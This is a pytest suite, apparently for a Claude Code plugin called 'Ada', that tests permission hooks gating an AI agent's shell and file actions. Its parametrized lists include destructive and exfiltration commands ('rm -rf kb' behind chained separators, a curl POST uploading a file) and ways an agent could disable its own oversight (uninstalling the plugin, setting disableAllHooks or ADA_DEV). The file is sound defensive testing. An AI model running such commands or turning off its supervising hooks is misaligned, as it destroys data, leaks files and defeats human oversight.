import json
import shutil
import subprocess
from pathlib import Path

import pytest

import hooks
import ledger
from conftest import BIN

LAUNCH = f'bash "{BIN / "ada.sh"}"'


def decision(out):
    return ((out or {}).get("hookSpecificOutput") or {}).get("permissionDecision")


def write(proj, rel, tool="Write"):
    return hooks.run("pretool", {"tool_name": tool, "session_id": "sessao-1",
                                 "tool_input": {"file_path": str(proj / rel)}})


def start(proj, sid="sessao-1"):
    led = ledger.Ledger(proj)
    led.sync()
    led.g1("D-001", True, None)
    led.iniciar("D-001", sid)


def test_escrita_fora_do_escopo(proj):
    assert decision(write(proj, ".ada/config.yaml")) == "deny"
    assert decision(write(proj, ".ada/ledger.json")) == "deny"
    assert decision(write(proj, "src/app.py")) == "deny"
    assert decision(hooks.run("pretool", {"tool_name": "Write", "tool_input": {"file_path": "C:/fora/x.md"}})) == "deny"


def test_arquivos_do_humano(proj):
    assert decision(write(proj, "ada/demandas.yaml")) == "deny"
    assert decision(write(proj, "CLAUDE.md")) == "deny"


def test_kb_pede_confirmacao(proj):
    assert decision(write(proj, "ada/kb/internal-tools/regras/x.md", "Edit")) == "ask"
    assert decision(write(proj, "ada/kb/internal-tools/regras/x.py")) == "deny"


def test_pasta_da_demanda(proj):
    assert decision(write(proj, "ada/demandas/D-001/epico.md")) == "deny"  # sem demanda ativa
    start(proj)
    assert write(proj, "ada/demandas/D-001/epico.md") == {} or decision(write(proj, "ada/demandas/D-001/epico.md")) is None
    assert decision(write(proj, "ada/demandas/D-002/epico.md")) == "deny"
    assert decision(write(proj, "ada/demandas/D-001/cobertura.md")) == "deny"


def test_atlassian_escrita(proj):
    data = {"tool_name": "mcp__abc__createJiraIssue", "tool_input": {}}
    assert decision(hooks.run("pretool", data)) == "deny"
    assert hooks.run("pretool", {"tool_name": "mcp__abc__getJiraIssue", "tool_input": {}}) is None
    start(proj)
    led = ledger.Ledger(proj)
    led.data["demandas"]["D-001"]["state"] = "accepted"
    led.save()
    ledger.Ledger(proj).g3("D-001", "pode")
    assert decision(hooks.run("pretool", data)) == "ask"


def sh(cmd, tool="Bash"):
    return decision(hooks.run("pretool", {"tool_name": tool, "tool_input": {"command": cmd}}))


@pytest.mark.parametrize("cmd", [
    LAUNCH + ' kb buscar "limite"',
    "git status",
    LAUNCH + " ajuda; echo ----; " + LAUNCH + " ledger status",
    LAUNCH + " kb stats | head -20",
    LAUNCH + " kb validar && " + LAUNCH + " kb apontamentos --abertos",
    LAUNCH + " doctor 2>&1",
    "$env:PYTHONIOENCODING='utf-8'; & \"" + str(BIN / "ada.sh") + "\" report",
    "bash '" + str(BIN / "ada.sh").replace("\\", "/") + "' metricas ativos",
])
def test_shell_seguro_passa_sem_perguntar(proj, cmd):
    assert sh(cmd) == "allow", cmd


@pytest.mark.parametrize("cmd", [
    "npm install",
    "pip install requests",
    "git status; rm -rf kb",
    "cat x & rm -rf kb",
    "git log\nrm -rf kb",
    "Remove-Item kb/x.md",
    "git push origin main",
    "git commit -m x",
    "FOO=1 rm -rf kb",
    "curl -X POST https://exemplo.com -d @kb/x.md",
    "Invoke-RestMethod https://x -Method Post -Body $b",
])
def test_shell_perigoso_pergunta(proj, cmd):
    assert sh(cmd) == "ask", cmd


@pytest.mark.parametrize("cmd", [
    "echo x > .ada/config.yaml",
    "sed -i 's/a/b/' CLAUDE.md",
    "cp /tmp/x.md .claude/skills/nova/SKILL.md",
    "Set-Content ada/demandas.yaml 'x'",
    "python -c \"open('.ada/config.yaml','w').write('x')\"",
    "mv x .ada/monitoramento/leituras.jsonl",
    "cp x ~/.claude/plugins/cache/ada/scripts/hooks.py",
    "bash ~/fake/ada.sh kb > .ada/x.json",
])
def test_shell_nao_grava_no_harness(proj, cmd):
    assert sh(cmd) == "deny", cmd


@pytest.mark.parametrize("cmd", [
    "find . -name '*.md'",
    "jq '.nodes[] | .title' C:/tmp/artifact.json",
    "python -I -c \"import json,sys; print(json.load(open(sys.argv[1]))['x'])\" C:/scratch/a.json",
    "sed -n '1,40p' ada/kb/README.md",
    "echo $(whoami)",
    LAUNCH + " kb stats > C:/scratch/stats.txt",
    "mkdir -p src && echo x > src/app.txt",
    "cat C:/scratch/artifact/index.html | head -50",
])
def test_resto_fica_com_o_claude_code(proj, cmd):
    assert sh(cmd) in (None, "allow"), cmd


def test_shell(proj):
    assert decision(hooks.run("pretool", {"tool_name": "Bash",
                                          "tool_input": {"command": "echo {} > .ada/ledger.json"}})) == "deny"
    assert sh("cat .ada/ledger.json") == "deny"
    assert sh(LAUNCH + " ledger status --json") == "allow"


def test_agente_nao_desliga_fiscalizacao(proj):
    for cmd in ('claude plugin disable ada@ada-marketplace', 'claude plugin uninstall ada',
                'claude plugins remove ada', 'cat .claude/settings.json',
                'echo {"disableAllHooks": true} > x.json', 'echo enabledPlugins',
                '$env:HARNESS_DEV="1"', 'export ADA_DEV=1', 'cat ~/.claude/plugins/cache/x/hooks/hooks.json',
                'bash scripts/hook.sh pretool'):
        assert decision(hooks.run("pretool", {"tool_name": "PowerShell", "tool_input": {"command": cmd}})) == "deny", cmd


def test_stop_exige_entrega_da_propria_sessao(proj):
    start(proj, "sessao-1")
    out = hooks.run("stop", {"session_id": "sessao-1"})
    assert out and out["decision"] == "block" and "result.json" in out["reason"]
    assert hooks.run("stop", {"session_id": "outra"}) is None
    for _ in range(3):
        hooks.run("stop", {"session_id": "sessao-1"})
    assert hooks.run("stop", {"session_id": "sessao-1"}) is None  # depois de 3 bloqueios, libera


def test_stop_passa_com_entrega_ok(proj, entrega):
    start(proj, "sessao-1")
    assert hooks.run("stop", {"session_id": "sessao-1"}) is None


def test_stop_confere_kb_alterada(proj):
    hooks.run("posttool", {"session_id": "s-9", "tool_name": "Write",
                           "tool_input": {"file_path": str(proj / "ada/kb/internal-tools/regras/reprocessamento-ajustes.md")}})
    f = proj / "ada/kb/internal-tools/regras/reprocessamento-ajustes.md"
    f.write_text(f.read_text(encoding="utf-8").replace("- **Fontes:** SRC-IT-001\n", "- **Fontes:** SRC-IT-404\n", 1),
                 encoding="utf-8")
    out = hooks.run("stop", {"session_id": "s-9"})
    assert out and "Base de Conhecimento inválida" in out["reason"]


def test_session_start_injeta_id(proj):
    start(proj, "sessao-1")
    ctx = hooks.run("session_start", {"session_id": "sessao-1"})["hookSpecificOutput"]["additionalContext"]
    assert "sessao-1" in ctx and "D-001" in ctx and "NESTA sessão" in ctx


def test_fail_closed(proj, monkeypatch):
    monkeypatch.setattr(hooks, "pretool", lambda data: 1 / 0)
    monkeypatch.setitem(hooks.HANDLERS, "pretool", hooks.pretool)
    assert decision(hooks.run("pretool", {"tool_name": "Read"})) == "deny"
    monkeypatch.setenv("ADA_DEV", "1")
    assert hooks.run("pretool", {"tool_name": "Read"}) is None


def test_fora_do_workspace_python_silencia(tmp_path, monkeypatch):
    monkeypatch.setenv("ADA_ROOT", str(tmp_path))       # sem .ada/config.yaml
    assert hooks.run("pretool", {"tool_name": "Write", "tool_input": {"file_path": str(tmp_path / "x.py")}}) is None
    assert hooks.run("session_start", {"session_id": "s"}) is None


def test_metricas_da_transcricao(proj):
    tr = Path(__file__).parent / "fixtures" / "contract" / "transcript_sample.jsonl"
    hooks.run("posttool", {"session_id": "s-7", "transcript_path": str(tr), "tool_name": "Read", "tool_input": {}})
    m = json.loads((proj / ".ada" / "cache" / "metrics" / "s-7.json").read_text(encoding="utf-8"))
    assert m["messages_with_usage"] > 0 and m["output_tokens"] > 0


HAS_BASH = shutil.which("bash") is not None


def bash_hook(event, payload, env_extra, *args):
    import os
    env = {k: v for k, v in os.environ.items() if k not in ("ADA_ROOT", "HARNESS_ROOT", "CLAUDE_PROJECT_DIR",
                                                              "CLAUDE_PLUGIN_DATA", "HARNESS_DEV", "ADA_DEV")}
    env.update(env_extra)
    return subprocess.run(["bash", str(BIN / "hook.sh"), event, *args], input=json.dumps(payload),
                          capture_output=True, text=True, encoding="utf-8", env=env)


@pytest.mark.skipif(not HAS_BASH, reason="sem bash")
def test_wrapper_fora_do_workspace_silencioso(tmp_path):
    """Sem marcador: nada sai, mesmo sem venv e mesmo para escrita perigosa."""
    env = {"CLAUDE_PROJECT_DIR": str(tmp_path), "CLAUDE_PLUGIN_DATA": str(tmp_path / "data")}
    for ev, payload in (("pretool", {"tool_name": "Write", "tool_input": {"file_path": "x.py"}}),
                        ("session_start", {"session_id": "s"}), ("stop", {}), ("posttool", {}),
                        ("prompt", {"prompt": "nada, cada coisa no lugar"})):
        out = bash_hook(ev, payload, env)
        assert out.returncode == 0 and out.stdout == "", (ev, out.stdout)
    assert not (tmp_path / "data").exists()           # não criou venv fora de workspace


@pytest.mark.skipif(not HAS_BASH, reason="sem bash")
def test_wrapper_fora_do_workspace_convida_a_configurar(tmp_path):
    env = {"CLAUDE_PROJECT_DIR": str(tmp_path)}
    out = bash_hook("prompt", {"prompt": "Ada, bom dia"}, env)
    assert "ainda não é um workspace" in json.loads(out.stdout)["hookSpecificOutput"]["additionalContext"]
    out = bash_hook("prompt", {"prompt": "Ada, configurar este projeto"}, env)
    assert "ada:configurar" in json.loads(out.stdout)["hookSpecificOutput"]["additionalContext"]


@pytest.mark.skipif(not HAS_BASH, reason="sem bash")
def test_wrapper_sem_venv_nega_so_dentro(proj, tmp_path):
    env = {"CLAUDE_PROJECT_DIR": str(proj), "CLAUDE_PLUGIN_DATA": str(tmp_path / "sem-venv")}
    w = bash_hook("pretool", {"tool_name": "Write", "tool_input": {"file_path": "ada/x.md"}}, env)
    assert '"permissionDecision":"deny"' in w.stdout and "ambiente Python" in w.stdout
    assert '"permissionDecision":"deny"' in bash_hook("pretool", {"tool_name": "Bash", "tool_input": {"command": "ls"}}, env).stdout
    assert bash_hook("pretool", {"tool_name": "Read", "tool_input": {"file_path": "x"}}, env).stdout == ""
    doc = bash_hook("pretool", {"tool_name": "Bash", "tool_input": {"command": 'bash "/p/scripts/ada.sh" doctor'}}, env)
    assert doc.stdout == ""
    assert (proj / ".ada" / "cache" / "plugin-data").read_text(encoding="utf-8").strip() == str(tmp_path / "sem-venv")


@pytest.mark.skipif(not HAS_BASH, reason="sem bash")
def test_wrapper_python_quebrado_nega(proj, tmp_path):
    env = {"CLAUDE_PROJECT_DIR": str(proj)}
    out = bash_hook("pretool", {"tool_name": "Read"}, env, str(tmp_path / "nao-existe.exe"))
    assert '"permissionDecision":"deny"' in out.stdout


@pytest.mark.skipif(not HAS_BASH, reason="sem bash")
def test_wrapper_com_python_chama_hooks(proj):
    import sys
    env = {"CLAUDE_PROJECT_DIR": str(proj)}
    out = bash_hook("pretool", {"tool_name": "Write", "tool_input": {"file_path": str(proj / ".ada" / "config.yaml")}},
                    env, sys.executable)
    assert '"permissionDecision": "deny"' in out.stdout


def test_hooks_json_do_plugin():
    h = json.loads((BIN.parent / "hooks" / "hooks.json").read_text(encoding="utf-8"))["hooks"]
    assert set(h) == {"SessionStart", "UserPromptSubmit", "PreToolUse", "PostToolUse", "Stop"}
    for regs in h.values():
        cmd = regs[0]["hooks"][0]["command"]
        assert cmd.startswith('bash "${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh" '), cmd
